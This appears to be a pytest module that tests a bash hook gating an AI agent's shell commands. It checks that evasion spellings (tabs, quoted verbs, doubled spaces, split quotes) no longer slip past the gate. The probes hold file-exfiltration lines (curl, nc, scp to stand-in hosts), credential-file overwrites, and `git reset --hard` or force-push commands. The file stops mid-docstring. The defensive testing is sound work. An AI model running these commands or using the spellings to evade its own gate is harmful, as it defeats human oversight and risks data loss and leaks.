"""The Bash gate's pattern layer must see the spellings a shell would run.

`hooks/scripts/writ-bash-write-gate.sh` gates six vectors (credential writes, Writ
gate state, irreversible destruction, a blocking `git commit`, ordinary writes, and
egress) through `case "$CMD" in *"literal"*)` guards that ask whether the RAW
command TEXT contains a substring, most of them requiring the verb followed by one
literal space. A shell asks a different question: whether the first word of a
command resolves to that verb. A tab, an adjacent quote, or a doubled space answers
"no" to the first question and "yes" to the second, and every guard's default arm
is `exit 0`, so the disagreement is a SILENT ALLOW. The fix normalizes a COPY of the
command (`CMD_N`, tab/newline to space, quote characters removed, space runs
collapsed) and routes the five fail-open sites onto it, while three sites
deliberately keep the raw text (`_readonly_inspection`, the two inner regex
discriminators, and the extractor's own command input, which since plan
dfacff61-23d5-474e-846c-2e2f0f0ea482 crosses as a `mktemp` FILE PATH in
`WRIT_BASH_CMD_FILE` rather than as the `WRIT_BASH_CMD` env string; what must stay
raw is the command text written into that file, not the variable that carried it).

WHY THIS FILE DOES NOT USE `tests/test_bash_write_gate.py::_extract`. `_extract`
slices the embedded python extractor out of the hook and runs it standalone, which
BYPASSES the bash prefilter by construction -- exactly the layer this defect lives
in. No capability here is proven through it; every test drives the REAL hook as a
subprocess with a real `PreToolUse` envelope, the shape
`tests/test_bash_irreversible_gate.py::_run` and
`tests/test_bash_write_gate.py::_run_hook` already use.

REUSED, NOT DUPLICATED: `_run_hook`, `_seed`, `SKILL_ROOT`, `HOOK_SH` and the
`sandbox_cwd` autouse fixture from `tests/test_bash_write_gate.py`; the tmp-scoped
`WRIT_CACHE_DIR` / `WRIT_FRICTION_LOG` / `WRIT_PORT=59999` /
`WRIT_NO_AUTOSTART=1` env shape from `tests/test_bash_irreversible_gate.py` (needed
here only where a relative script path must resolve against the real repo root);
the blocking-verdict seed shape from `tests/test_review_blocking.py`, reproduced
through `review_findings.record`/`parse_verdict` rather than imported from that
module, so this file gains no new edge into that module's namespace.

DERIVATION, not a hardcoded list. Capabilities 1-6 (the write/egress prefilter
matrix) come from a `# PREFILTER PATTERNS BEGIN/END` marker block the fix adds
around the case arm's glob literals; `PROBE_TABLE` maps each SPACE-BEARING literal
to one canonical, already-working, single-space probe command, and a test asserts
`PROBE_TABLE`'s key set equals the derived population (capability 1) so a verb glob
added to that block with no probe goes red instead of sitting outside a stale list.
Capability 16 (no process spawn) reads a second marker block,
`# CMD NORMALIZATION BEGIN/END`, both names given verbatim in plan.md.

TWO CORRECTIONS applied here after measuring the real, unmodified hook, per the
dispatch:
  1. A destructive command on the SECOND LINE of a multi-line command is NOT a
     silent bypass for the phrase-matched irreversibility arms (`git reset
     --hard`, and its siblings): `case` glob matching is not line-anchored, so
     `*"git reset --hard"*` matches straight across an embedded newline. This file
     does not assert that as a bypass. The genuinely blind multi-line vector is
     `_irrev_script_target`'s `read -ra`, which reads only ONE line into its token
     array (capability 9), and the `git commit` ask's inner grep, whose `^` anchor
     is genuinely line-oriented and would break if fed the normalized, newline-
     flattened copy (capability 14).
  2. `python3 -c "open('x.txt','w').write(1)"` and similar bodies are NOT used
     anywhere here as a "this cycle closes it" example: whether or not that exact
     shape is detected is unrelated to the CMD_N routing this cycle changes (that
     class of miss, when it exists, is the hook's own disclosed inline-code
     coverage limit). Capability 7 uses the plan's own literal example,
     `open('src/x.py','w')`, which the existing suite already confirms the
     extractor resolves once it is reached.

OUT OF SCOPE HERE, each because it is a different layer or already covered
elsewhere: the three mid-word quote splits on the write/egress path resolve at the
EXTRACTOR (`shlex.split(posix=False)`), not the bash prefilter, and stay a strict
xfail (capability 17) rather than a fixed behavior; the reordered-flags
irreversibility residue (`git reset HEAD~1 --hard`) is not itself a numbered
capabilities.md item, but is pinned as a bonus strict xfail alongside the named one
since the dispatch measured it directly; capability 18 ("the process figures ... are
measured with `tests/_strace.py::trace_execve` and recorded in the commit message
and the ADR amendment") is an OPERATIONAL step for the implementer, not a pytest
assertion, and has no test in this file -- capability 16's structural, spawn-free
pin is the only test-level cost ratchet named in the plan.

Nothing here executes a destructive command: every command is data inside a JSON
`PreToolUse` envelope piped to the hook's stdin, never handed to a real shell.
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import sys
import uuid
from pathlib import Path

import pytest

# autouse: pins process cwd to a throwaway sandbox for every test in this module, the
# same reason tests/test_bash_write_gate.py and tests/test_bash_control_operator_split.py
# import it -- a spawned `mode set work` or a stray in-process cache write must not land
# on THIS repo's own approval artifacts.
from tests.fixtures.session_state import sandbox_cwd  # noqa: F401
from tests.test_bash_write_gate import HOOK_SH, SKILL_ROOT, _run_hook, _seed

sys.path.insert(0, os.path.join(SKILL_ROOT, "bin", "lib"))


def _hook_src() -> str:
    return Path(HOOK_SH).read_text()


# --------------------------------------------------------------------------- #
# Derivation: the write/egress prefilter population, from the hook's own marker
# block rather than a list kept here.
# --------------------------------------------------------------------------- #
_PREFILTER_BEGIN = "# PREFILTER PATTERNS BEGIN"
_PREFILTER_END = "# PREFILTER PATTERNS END"
_GLOB_LITERAL_RE = re.compile(r'\*"([^"]*)"\*')


def _prefilter_block(source: str) -> str:
    assert _PREFILTER_BEGIN in source, (
        "PREFILTER PATTERNS marker not found; the write/egress prefilter case arm "
        "has not been wrapped with the marker block this derivation reads"
    )
    start = source.index(_PREFILTER_BEGIN)
    start = source.index("\n", start) + 1
    end = source.index(_PREFILTER_END, start)
    return source[start:end]


def prefilter_glob_literals(source: str) -> set[str]:
    """Every `*"..."*` glob literal inside the marker block, parsed rather than
    listed here: a verb glob added to (or removed from) the case arm changes this
    set with no edit needed in this file."""
    literals = set(_GLOB_LITERAL_RE.findall(_prefilter_block(source)))
    assert literals, "no glob literals parsed out of the PREFILTER PATTERNS block"
    return literals


def space_bearing_prefilter_literals(source: str) -> set[str]:
    """The subset of prefilter_glob_literals containing a space: the shape a
    single-space-anchored `case` pattern cannot see past a tab, an adjacent quote,
    or a doubled space. Excluded by PROPERTY (no space char), not a hardcoded
    space-free list."""
    space_bearing = {lit for lit in prefilter_glob_literals(source) if " " in lit}
    assert space_bearing, "no space-bearing glob literal derived; population is empty"
    return space_bearing


def _derived_population() -> set[str]:
    """The population, or the EMPTY SET when the marker block is absent.

    IMPORT MUST NOT RAISE. An assertion at module scope becomes a COLLECTION ERROR,
    which aborts the whole session's collection rather than reddening this module, so
    running the suite in chunks fails on an unrelated file. The missing marker is
    instead reported by test_the_derived_population_is_non_empty below, which fails
    loudly with the same message.

    An empty population must never go quiet. Nothing here parametrizes over it (the
    per-member cases run off PROBE_TABLE, which is local), and the two tests that read
    it both fail on an empty set rather than passing trivially.
    """
    try:
        return space_bearing_prefilter_literals(_hook_src())
    except (AssertionError, ValueError):
        return set()


DERIVED_POPULATION = _derived_population()


# --------------------------------------------------------------------------- #
# The probe table: one canonical, single-space-spelling command per member. Every
# command starts with its own verb (a plain string prefix), which is what lets the
# tab / quoted-verb / doubled-space spellings below be DERIVED per member instead
# of hand-written three times each.
# --------------------------------------------------------------------------- #
# The segment's VERB to quote, when it differs from the glob literal's own first
# word. The only case: "gist " names an ARGUMENT to `gh` (`gh gist create`), not a
# verb egress_gh resolves through verb_at() -- quoting "gist" would prove nothing
# about the mechanism this cycle fixes.
_VERB_OVERRIDES = {"gist ": "gh"}


def _verb_for(member: str) -> str:
    return _VERB_OVERRIDES.get(member, member.strip().split()[0])


PROBE_TABLE: dict[str, str] = {
    "tee ": "tee .env",
    "dd ": "dd if=/dev/zero of=.env",
    "cp ": "cp readme .env",
    "mv ": "mv readme .env",
    "install ": "install readme .env",
    "sed -i": "sed -i s/a/b/ .env",
    "sed --in-place": "sed --in-place s/a/b/ .env",
    "wget ": "wget --post-data='a=1' https://example.com/x",
    "scp ": "scp ./notes.md user@remote.example.com:/tmp/",
    "rsync ": "rsync -a ./src/ remote.example.com:/backup/",
    "sftp ": "sftp user@remote.example.com",
    "gist ": "gh gist create notes.md",
    "nc ": "nc remote.example.com 9000 < f",
    "ncat ": "ncat remote.example.com 9000 < f",
    "netcat ": "netcat remote.example.com 9000 < f",
    "telnet ": "telnet remote.example.com 23 < f",
    "curl ": "curl -d @readme https://example.invalid",
}

# Members whose canonical probe denies locally with SEC-CREDENTIAL-WRITE. Every
# other PROBE_TABLE member's canonical probe asks with SEC-BASH-EGRESS. Both
# verdicts are daemon-free (credential deny is the local backstop; egress ask reads
# no mode and calls no server), which is why this matrix needs no CLI-fallback /
# ENF-GATE-PLAN route the way TestInlineInterpreterSecondStage does.
CRED_VERDICT_MEMBERS = {"tee ", "dd ", "cp ", "mv ", "install ", "sed -i", "sed --in-place"}

# A member landing here instead of in PROBE_TABLE must carry a non-empty reason, so
# a future space-bearing glob whose vector the extractor does not implement has a
# named place instead of silently shrinking PROBE_TABLE's key set. Empty today:
# every derived member has an implemented probe.
# EXPLAINED EXCLUSIONS BEGIN
EXPLAINED_EXCLUSIONS: dict[str, str] = {}
# EXPLAINED EXCLUSIONS END

MEMBERS = sorted(PROBE_TABLE)


def _tab_spelling(member: str, canonical: str) -> str:
    """Replace the pattern's OWN space (the one inside `member`) with a tab."""
    return canonical.replace(member, member.replace(" ", "\t"), 1)


def _doubled_space_spelling(member: str, canonical: str) -> str:
    """Double the pattern's OWN space."""
    return canonical.replace(member, member.replace(" ", "  "), 1)


def _quoted_verb_spelling(member: str, canonical: str) -> str:
    """Wrap the SEGMENT'S VERB -- never the pattern's first word -- in double
    quotes."""
    verb = _verb_for(member)
    assert canonical.startswith(verb), (member, canonical, verb)
    return '"%s"' % verb + canonical[len(verb):]


def _seed_critical_verdict(sid: str) -> None:
    """Write a CRITICAL reviewer verdict straight into the session cache: the shape
    tests/test_review_blocking.py's BLOCKING_MESSAGE takes, reproduced here rather
    than imported so this module gains no edge into that test module's namespace."""
    from review_findings import record

    message = (
        "Review complete.\n\n```json\n"
        '{"spec_compliance": "fail", "status": "changes_requested", '
        '"critical": [{"file": "writ/gate.py", "line": 12, '
        '"finding": "auth check removed", "rule_id": "SEC-AUTHZ-RBAC-001"}], '
        '"important": [], "minor": []}\n```\n'
    )
    record(sid, message)


def _run_repo(cmd: str, tmp_path: Path, sid: str = "pattern-irrev-repo") -> dict | None:
    """Feed `cmd` to the hook with CWD pinned to the repo root -- the shape
    tests/test_bash_irreversible_gate.py::_run uses -- so a relative script path
    (`benchmarks/bench_targets.py`) resolves against real project files. Isolated
    cache/friction/port per call; no daemon required."""
    friction = tmp_path / "friction.jsonl"
    cache_dir = tmp_path / "cache"
    cache_dir.mkdir(parents=True, exist_ok=True)
    env = {
        **os.environ,
        "WRIT_CACHE_DIR": str(cache_dir),
        "WRIT_FRICTION_LOG": str(friction),
        "WRIT_PORT": "59999",
        "WRIT_NO_AUTOSTART": "1",
    }
    envelope = json.dumps({"session_id": sid, "tool_name": "Bash",
                           "tool_input": {"command": cmd}})
    proc = subprocess.run(["bash", HOOK_SH], input=envelope, cwd=SKILL_ROOT,
                          capture_output=True, text=True, env=env, timeout=120)
    out = proc.stdout.strip()
    return json.loads(out).get("hookSpecificOutput", {}) if out else None


# --------------------------------------------------------------------------- #
# Capabilities 1, 2: the population itself, derived and property-excluded.
# --------------------------------------------------------------------------- #
class TestPopulationDerivation:
    def test_the_derived_population_is_non_empty(self):
        """The marker block exists and the scan found space-bearing globs in it.

        This is the test the module-scope derivation deliberately does NOT raise for:
        an assertion at import becomes a collection ERROR, which aborts the whole
        session's collection instead of reddening this file. Failing here says the same
        thing without taking the rest of the suite down with it.

        Reddened by removing the `# PREFILTER PATTERNS BEGIN/END` markers from the hook,
        or by narrowing the glob scan so it parses nothing out of the block.
        """
        assert DERIVED_POPULATION, (
            "no space-bearing glob literal derived from the PREFILTER PATTERNS block: "
            "either the markers are absent from hooks/scripts/writ-bash-write-gate.sh "
            "or the scan no longer matches the case arm's `*\"verb \"*` spelling"
        )

    def test_probe_table_key_set_equals_derived_population(self):
        """Reddened by adding a space-bearing verb glob to the PREFILTER PATTERNS
        block with no PROBE_TABLE entry (and no EXPLAINED_EXCLUSIONS entry) for it."""
        covered = set(PROBE_TABLE) | set(EXPLAINED_EXCLUSIONS)
        assert covered == DERIVED_POPULATION, (covered, DERIVED_POPULATION)

    def test_every_explained_exclusion_carries_a_non_empty_reason(self):
        """Guards against a silent `"member": ""` entry standing in for a real probe."""
        assert all(EXPLAINED_EXCLUSIONS.values())

    def test_space_free_globs_are_excluded_from_the_derived_population(self):
        """Reddened by excluding a space-bearing pattern from the derivation: checks
        the raw glob population directly, so a broken filter that drops a
        space-bearing member would show up here as a non-empty intersection."""
        all_literals = prefilter_glob_literals(_hook_src())
        space_free = {lit for lit in all_literals if " " not in lit}
        assert space_free, "no space-free glob literal found; this check is vacuous"
        assert space_free.isdisjoint(DERIVED_POPULATION)
        assert all(" " in lit for lit in DERIVED_POPULATION)

    def test_the_glob_scan_is_precise_against_synthetic_source(self):
        synthetic = (
            "# PREFILTER PATTERNS BEGIN\n"
            '*">"* | *"tee "* | *"--in-place"*\n'
            "# PREFILTER PATTERNS END\n"
        )
        assert prefilter_glob_literals(synthetic) == {">", "tee ", "--in-place"}
        assert space_bearing_prefilter_literals(synthetic) == {"tee "}

    def test_a_never_before_seen_space_free_pattern_is_excluded_automatically(self):
        """PROPERTY, not a hardcoded list: a literal that has never appeared anywhere
        in this file is still excluded purely because it contains no space."""
        synthetic = (
            "# PREFILTER PATTERNS BEGIN\n"
            '*"tee "* | *"--brand-new-flag"*\n'
            "# PREFILTER PATTERNS END\n"
        )
        assert space_bearing_prefilter_literals(synthetic) == {"tee "}

    def test_the_scan_reddens_when_the_marker_block_holds_no_glob_literal(self):
        """A DECAYED hook (the whole arm list deleted, markers left behind) must not
        read green here."""
        synthetic = "# PREFILTER PATTERNS BEGIN\n\n# PREFILTER PATTERNS END\n"
        with pytest.raises(AssertionError):
            prefilter_glob_literals(synthetic)


# --------------------------------------------------------------------------- #
# Capabilities 3, 4, 5, 6: the matrix itself, driven through the REAL hook.
# --------------------------------------------------------------------------- #
class TestPrefilterBlindSpellings:
    """Population and probes above; the three blind spellings below are DERIVED per
    member so a new PROBE_TABLE entry automatically gets all three, rather than
    needing three more hand-written commands."""

    def _run(self, cmd: str, tmp_path: Path) -> dict | None:
        sid = f"pattern-pf-{uuid.uuid4().hex[:8]}"
        _seed(sid, mode="conversation")
        return _run_hook(cmd, sid, str(tmp_path))

    def _assert_verdict(self, member: str, out: dict | None, cmd: str) -> None:
        if member in CRED_VERDICT_MEMBERS:
            assert out is not None and out.get("permissionDecision") == "deny", (cmd, out)
            assert "SEC-CREDENTIAL-WRITE" in out.get("permissionDecisionReason", ""), (cmd, out)
        else:
            assert out is not None and out.get("permissionDecision") == "ask", (cmd, out)
            assert "SEC-BASH-EGRESS" in out.get("permissionDecisionReason", ""), (cmd, out)

    @pytest.mark.parametrize("member", MEMBERS)
    def test_canonical_spelling_produces_its_verdict(self, member, tmp_path):
        """Anti-vacuity control for the three blind spellings below: reddened by
        breaking any probe command so its canonical, single-space form goes silent."""
        cmd = PROBE_TABLE[member]
        self._assert_verdict(member, self._run(cmd, tmp_path), cmd)

    @pytest.mark.parametrize("member", MEMBERS)
    def test_tab_spelling_matches_the_canonical_verdict(self, member, tmp_path):
        """Reddened by deleting the tab-and-newline-to-space translation."""
        cmd = _tab_spelling(member, PROBE_TABLE[member])
        self._assert_verdict(member, self._run(cmd, tmp_path), cmd)

    @pytest.mark.parametrize("member", MEMBERS)
    def test_quoted_verb_spelling_matches_the_canonical_verdict(self, member, tmp_path):
        """Reddened by deleting the quote-removal substitution."""
        cmd = _quoted_verb_spelling(member, PROBE_TABLE[member])
        self._assert_verdict(member, self._run(cmd, tmp_path), cmd)

    @pytest.mark.parametrize("member", MEMBERS)
    def test_doubled_space_spelling_matches_the_canonical_verdict(self, member, tmp_path):
        """Reddened by deleting the space-run-collapsing loop."""
        cmd = _doubled_space_spelling(member, PROBE_TABLE[member])
        self._assert_verdict(member, self._run(cmd, tmp_path), cmd)


# --------------------------------------------------------------------------- #
# Capability 7: the inline-interpreter second-stage case.
# --------------------------------------------------------------------------- #
class TestInlineInterpreterSecondStage:
    """Stage 1 (`*python*|*node*|...`) is already whitespace-blind; stage 2
    (`*" -c"*|...`) requires a literal space before the inline-code flag."""

    def _work_session(self) -> str:
        sid = f"pattern-inline-{uuid.uuid4().hex[:8]}"
        _seed(sid, mode="work", gates_approved=[], current_phase=None)
        return sid

    def _deny_plan(self, out: dict | None) -> None:
        assert out is not None and out.get("permissionDecision") == "deny", out
        assert "ENF-GATE-PLAN" in out.get("permissionDecisionReason", ""), out

    def test_tab_before_dash_c_denies_enf_gate_plan(self, tmp_path):
        """Reddened by reverting the inline-interpreter second-stage case to match
        on the raw command instead of the normalized copy."""
        cmd = "python3\t-c \"open('src/x.py','w')\""
        out = _run_hook(cmd, self._work_session(), str(tmp_path))
        self._deny_plan(out)

    def test_canonical_single_space_spelling_also_denies(self, tmp_path):
        """Anti-vacuity control: the single-space spelling must already reach the
        extractor and be resolved, or the tab test above would pass for the wrong
        reason."""
        cmd = "python3 -c \"open('src/x.py','w')\""
        out = _run_hook(cmd, self._work_session(), str(tmp_path))
        self._deny_plan(out)


# --------------------------------------------------------------------------- #
# Capability 8: the irreversibility guard's git spellings.
# --------------------------------------------------------------------------- #
IRREV_BLIND_SPELLINGS = [
    ("tab_reset_hard", "git\treset --hard HEAD~1"),
    ("quoted_verb_reset_hard", '"git" reset --hard HEAD~1'),
    ("doubled_space_reset_hard", "git  reset  --hard HEAD~1"),
    ("tab_push_force", "git\tpush --force origin main"),
]


class TestIrreversibilityGuardBlindSpellings:
    def _run(self, cmd: str, tmp_path: Path) -> dict | None:
        sid = f"pattern-irr-{uuid.uuid4().hex[:8]}"
        return _run_hook(cmd, sid, str(tmp_path))

    @pytest.mark.parametrize("name,cmd", IRREV_BLIND_SPELLINGS,
                             ids=[n for n, _c in IRREV_BLIND_SPELLINGS])
    def test_blind_spelling_denies_enf_irreversible(self, name, cmd, tmp_path):
        """Reddened by computing `lower` in `_irreversible_reason` from the raw
        command instead of the normalized copy."""
        out = self._run(cmd, tmp_path)
        assert out is not None and out.get("permissionDecision") == "deny", (cmd, out)
        assert "ENF-IRREVERSIBLE" in out.get("permissionDecisionReason", ""), (cmd, out)

    def test_canonical_reset_hard_denies(self, tmp_path):
        """Anti-vacuity control for the three `git reset --hard` blind spellings above."""
        out = self._run("git reset --hard HEAD~1", tmp_path)
        assert out is not None and out.get("permissionDecision") == "deny", out

    def test_canonical_push_force_denies(self, tmp_path):
        """Anti-vacuity control for the `git push --force` blind spelling above."""
        out = self._run("git push --force origin main", tmp_path)
        assert out is not None and out.get("permissionDecision") == "deny", out


# --------------------------------------------------------------------------- #
# Capability 9: _irrev_script_target's one-line read, on a multi-line command.
# --------------------------------------------------------------------------- #
class TestIrrevScriptTargetMultilineSecondLine:
    """`_irrev_script_target`'s `read -ra toks <<< "$cmd"` reads ONE LINE. The fix
    routes it the NORMALIZED copy, whose newline-to-space pass has already
    flattened a multi-line command to one line before `_irrev_script_target` ever
    sees it, so a script named on the second line is walkable. NOT the same
    residue as `git reset --hard` on a second line, which already matches today
    because `case` glob matching is not line-anchored -- see the module docstring."""

    def test_second_line_destructive_script_invocation_denies(self, tmp_path):
        """Reddened by passing the raw command (not the normalized copy) to
        `_irrev_script_target`: the raw command's real embedded newline stops
        `read -ra` after the first line, so the script named on line 2 is never
        seen and its content is never read."""
        cmd = "ls\npython3 benchmarks/bench_targets.py"
        out = _run_repo(cmd, tmp_path, sid="pattern-irrev-ml")
        assert out is not None and out.get("permissionDecision") == "deny", out
        assert "ENF-IRREVERSIBLE" in out.get("permissionDecisionReason", ""), out

    def test_single_line_control_still_denies(self, tmp_path):
        """Anti-vacuity control: the one-line form must already work today."""
        out = _run_repo("python3 benchmarks/bench_targets.py", tmp_path,
                        sid="pattern-irrev-ml-ctrl")
        assert out is not None and out.get("permissionDecision") == "deny", out


# --------------------------------------------------------------------------- #
# Capability 10: the quoted script argument.
# --------------------------------------------------------------------------- #
class TestIrrevScriptTargetQuotedArgument:
    def test_quoted_script_argument_denies(self, tmp_path):
        """Reddened by deleting the quote-removal substitution: the raw token ends
        in a quote character (`.py"`), which the `*.py` glob `_irrev_script_target`
        walks does not match, so the script's content is never read."""
        out = _run_repo('python3 "benchmarks/bench_targets.py"', tmp_path,
                        sid="pattern-irrev-q")
        assert out is not None and out.get("permissionDecision") == "deny", out
        assert "ENF-IRREVERSIBLE" in out.get("permissionDecisionReason", ""), out

    def test_canonical_unquoted_spelling_denies(self, tmp_path):
        """Anti-vacuity control."""
        out = _run_repo("python3 benchmarks/bench_targets.py", tmp_path,
                        sid="pattern-irrev-q-ctrl")
        assert out is not None and out.get("permissionDecision") == "deny", out


# --------------------------------------------------------------------------- #
# Capability 11: read-only inspection and --force-with-lease must not regress.
# --------------------------------------------------------------------------- #
class TestReadOnlyInspectionAndForceWithLeaseStayAllowed:
    """`_irreversible_reason` gains a second parameter this cycle
    (`_irreversible_reason "$CMD" "$CMD_N"`); `_readonly_inspection` must keep
    reading the FIRST (raw) one. Reddened by deleting the `_readonly_inspection`
    call from `_irreversible_reason`, or by routing it onto the normalized copy."""

    def _run(self, cmd: str, tmp_path: Path) -> dict | None:
        sid = f"pattern-ro-{uuid.uuid4().hex[:8]}"
        return _run_hook(cmd, sid, str(tmp_path))

    def test_cat_of_the_destructive_script_stays_allowed(self, tmp_path):
        assert self._run("cat benchmarks/bench_targets.py", tmp_path) is None

    def test_grep_naming_a_destructive_git_command_stays_allowed(self, tmp_path):
        out = self._run('grep -rn "git reset --hard" docs/', tmp_path)
        assert out is None, out

    def test_force_with_lease_stays_allowed(self, tmp_path):
        out = self._run("git push --force-with-lease origin main", tmp_path)
        assert out is None, out


# --------------------------------------------------------------------------- #
# Capability 12: the gate-state name guard's spellings.
# --------------------------------------------------------------------------- #
class TestGateStateNameGuardSpellings:
    def _sid(self) -> str:
        return f"pattern-state-{uuid.uuid4().hex[:8]}"

    def _deny(self, out: dict | None) -> None:
        assert out is not None and out.get("permissionDecision") == "deny", out
        assert "ENF-GATE-STATE" in out.get("permissionDecisionReason", ""), out

    def test_mid_word_quote_split_auto_approve_gate_denies(self, tmp_path):
        """Reddened by reverting CMD_FOR_STATE_MATCH to the raw command: the
        embedded quote pair splits 'auto-approve-gate' into two literal runs the
        pattern's plain substring match cannot see across; quote removal collapses
        them back together with no space inserted, the same way a real shell does
        for adjacent quoting."""
        cmd = 'bash hooks/scripts/auto-approve"-"gate.sh'
        self._deny(_run_hook(cmd, self._sid(), str(tmp_path)))

    def test_bare_cat_of_a_gate_state_path_stays_silent(self, tmp_path):
        """Control, unaffected by this cycle's fix: `_readonly_inspection` always
        runs on the raw command, and a bare `cat` verb already qualifies as
        read-only inspection today."""
        cmd = "cat writ-grant-x.json"
        assert _run_hook(cmd, self._sid(), str(tmp_path)) is None

    def test_quoted_cat_of_a_gate_state_path_is_still_refused(self, tmp_path):
        """DELIBERATE asymmetry, not a bug, and unaffected by this cycle's fix:
        quoting the verb makes `_readonly_inspection`'s bare-verb comparison
        (the literal `"cat"` never equals the bare `cat` case pattern) fail, so a
        quoted read-only inspector is refused where the bare spelling is allowed.
        `_readonly_inspection` stays on raw text specifically so this cycle's
        quote-removal cannot loosen it -- see the module analysis note on why that
        is a load-bearing decision rather than an omission."""
        cmd = '"cat" writ-grant-x.json'
        self._deny(_run_hook(cmd, self._sid(), str(tmp_path)))

    def test_quoted_pytest_invocation_naming_the_test_file_stays_runnable(self, tmp_path):
        """Control: the module-scrub's substring match already finds
        'test_manual_test_grant.py' inside a quoted argument today, because the
        quotes sit at the argument's boundary rather than inside the filename
        itself, so this stays true on both sides of the fix."""
        cmd = 'pytest "tests/test_manual_test_grant.py"'
        assert _run_hook(cmd, self._sid(), str(tmp_path)) is None


# --------------------------------------------------------------------------- #
# Capability 13: the git commit outer case's tab spelling.
# --------------------------------------------------------------------------- #
class TestGitCommitOuterCaseSpelling:
    def _sid_with_critical(self) -> str:
        sid = f"pattern-commit-{uuid.uuid4().hex[:8]}"
        _seed_critical_verdict(sid)
        return sid

    def test_tab_before_commit_asks_with_reviewer_reason(self, tmp_path):
        """Reddened by reverting the outer `case ... in *"git commit"*...)` arm to
        match on the raw command: a tab between git and commit is not the literal
        space the substring match requires."""
        out = _run_hook("git\tcommit -m x", self._sid_with_critical(), str(tmp_path))
        assert out is not None and out.get("permissionDecision") == "ask", out
        assert "reviewer left" in out.get("permissionDecisionReason", ""), out

    def test_canonical_git_commit_asks_too(self, tmp_path):
        """Anti-vacuity control."""
        out = _run_hook("git commit -m x", self._sid_with_critical(), str(tmp_path))
        assert out is not None and out.get("permissionDecision") == "ask", out

    def test_grep_mentioning_git_commit_still_does_not_ask(self, tmp_path):
        """Control: the outer case is a cheap prefilter and already matches a
        quoted mention; the inner `_GIT_COMMIT_RE` grep (kept on the raw command,
        unchanged by this cycle) requires 'git' to start the command or follow a
        control operator, which a grep argument does not satisfy. Seeded with the
        same CRITICAL verdict so the absence of an ask is provably the regex, not
        a missing verdict."""
        out = _run_hook('grep "git commit" notes.txt', self._sid_with_critical(), str(tmp_path))
        assert out is None, out


# --------------------------------------------------------------------------- #
# Capability 14: the multi-line git commit, inner grep stays line-oriented.
# --------------------------------------------------------------------------- #
class TestGitCommitMultilineSecondLine:
    def test_second_line_git_commit_still_asks(self, tmp_path):
        """Regression guard against the wrong implementation choice: reddened by
        passing the NORMALIZED copy to the inner `_GIT_COMMIT_RE` grep instead of
        the raw command. grep's `^` anchor is PER-LINE by default, so it matches
        'git commit' starting the second real line of the raw command; flattening
        the newline to a space first removes that line boundary, and neither `^`
        nor a preceding control operator sits in front of 'git' any more."""
        sid = f"pattern-commit-ml-{uuid.uuid4().hex[:8]}"
        _seed_critical_verdict(sid)
        out = _run_hook("ls\ngit commit -m x", sid, str(tmp_path))
        assert out is not None and out.get("permissionDecision") == "ask", out
        assert "reviewer left" in out.get("permissionDecisionReason", ""), out


# --------------------------------------------------------------------------- #
# Capability 15: the extractor's own input must stay raw.
# --------------------------------------------------------------------------- #
class TestExtractorInputStaysRaw:
    """The extractor's command file must be written from `$CMD`, never from `$CMD_N`
    (the retired spelling was `WRIT_BASH_CMD="$CMD"`; the property is the same one).
    Reddened by writing the normalized copy instead: a quote-stripped `grep '>' app.pem`
    tokenizes with a bare `>` sitting in redirect position, which the extractor would
    then read as a credential-write target, turning a read-only grep into a false
    SEC-CREDENTIAL-WRITE deny."""

    def test_quoted_redirect_char_through_the_real_hook_stays_allowed(self, tmp_path):
        sid = f"pattern-extract-{uuid.uuid4().hex[:8]}"
        _seed(sid, mode="conversation")
        out = _run_hook("grep '>' app.pem", sid, str(tmp_path))
        assert out is None, out


# --------------------------------------------------------------------------- #
# Capability 16: the normalization block spawns no process.
# --------------------------------------------------------------------------- #
_NORM_BEGIN = "# CMD NORMALIZATION BEGIN"
_NORM_END = "# CMD NORMALIZATION END"


def _normalization_block(source: str) -> str:
    assert _NORM_BEGIN in source, (
        "CMD NORMALIZATION marker not found; the normalized copy has not been "
        "added to the hook yet"
    )
    start = source.index(_NORM_BEGIN)
    start = source.index("\n", start) + 1
    end = source.index(_NORM_END, start)
    return source[start:end]


class TestNormalizationBlockSpawnsNoProcess:
    """Structural pin, not a strace measurement: PERF-QBUDGET-001's per-call cost
    claim rests on the normalization being pure parameter expansion. Reddened by
    replacing the space-collapsing loop with a `tr -s` pipeline, or any other
    command substitution / pipe / external-command form."""

    def test_block_exists_and_is_not_empty(self):
        block = _normalization_block(_hook_src())
        assert block.strip()

    def test_block_contains_no_command_substitution(self):
        block = _normalization_block(_hook_src())
        assert "$(" not in block
        assert "`" not in block

    def test_block_contains_no_pipe(self):
        block = _normalization_block(_hook_src())
        assert "|" not in block

    def test_block_invokes_no_known_external_filter(self):
        block = _normalization_block(_hook_src())
        for name in ("tr ", "tr\t", "sed ", "awk ", "perl ", "python"):
            assert name not in block, (name, block)

    def test_the_collapse_is_single_pass_not_a_fixed_point_loop(self):
        """Structural half of the cost bound: no loop in the block.

        Review measured the original `while [[ "$CMD_N" == *"  "* ]]` fixed-point loop
        at 0.03s for 10,000 consecutive spaces, 0.46s at 40,000 and 1.88s at 80,000,
        quadratic in the whitespace run, on EVERY Bash call before any guard runs. The
        replacement is one `read -ra` plus `"${_w[*]}"`, which is O(n) and forks nothing:
        400,000 spaces in 0.03s, measured.

        Reddened by restoring any `while`/`until`/`for` in the normalization block.
        """
        block = _normalization_block(_hook_src())
        for keyword in ("while", "until", "for "):
            assert keyword not in block, (
                "the normalization block must not iterate: a fixed-point collapse loop "
                "is quadratic in the longest whitespace run and runs before every guard"
            )

    def test_a_large_whitespace_run_still_collapses_to_one_space(self):
        """Correctness at scale, and a catastrophic-regression ceiling.

        The no-loop test above is the real cost ratchet; this one proves the single pass
        still produces a matchable command at a size where the old fixed-point loop was
        measurably slow (1.88s at 80,000 spaces, quadratic), and the 20s timeout catches
        a regression of the order the loop actually reached (74s at 500,000). It is not a
        tight timing threshold, so a loaded machine cannot flip it.

        SIZE STAYS UNDER 128 KiB, AND THE REASON HAS CHANGED. It used to be that at about
        131,050 characters this exact credential probe went SILENT, because the
        extractor's command was handed over through the environment and MAX_ARG_STRLEN
        (32 pages) made the spawn fail: a pre-existing fail-open of the whole gate,
        measured but out of that cycle's scope. That cliff is CLOSED (plan
        dfacff61-23d5-474e-846c-2e2f0f0ea482): the command now crosses as a `mktemp`
        file path, and the oversized case is pinned as a DENY in
        tests/test_exec_boundary_write_doors.py, which owns both sides of the limit.
        This test keeps its 120,000 spaces because its subject is the normalization's
        COST, not the transport: the figure it is compared against (1.88s at 80,000
        spaces for the retired fixed-point loop) was measured at this size, and the
        module docstring above scopes this file to the pattern layer.

